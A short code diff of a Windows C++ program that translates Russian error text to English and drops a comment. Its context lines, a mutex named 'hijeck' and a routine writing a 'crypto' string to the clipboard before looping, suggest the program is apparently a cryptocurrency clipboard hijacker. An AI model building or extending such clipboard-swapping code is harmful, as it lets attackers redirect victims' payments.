@@ -25,7 +25,7 @@ void main()
 	HANDLE hijeck = CreateMutex(NULL, false, L"My_programm_Already_Present");
 	if (GetLastError() == ERROR_ALREADY_EXISTS)
 	{
-		MessageBoxW(NULL, L"Программа уже запущена", L"Ошибка", MB_SYSTEMMODAL | MB_ICONERROR);
+		MessageBoxW(NULL, L"The program is already running", L"Error", MB_SYSTEMMODAL | MB_ICONERROR);
 		CloseHandle(hijeck);
 	}
 
@@ -127,7 +127,7 @@ void Writebuffer(string& crypto)
 		chBuffer = (char*)GlobalLock(buffer);
 		memcpy(GlobalLock(buffer), crypto.c_str(), crypto.size() + 1);
 		GlobalUnlock(buffer);
-		SetClipboardData(CF_TEXT, buffer); //помещаем данные в буффер
+		SetClipboardData(CF_TEXT, buffer); 
 		CloseClipboard();
 		Sleep(2000);
 		Reactor();
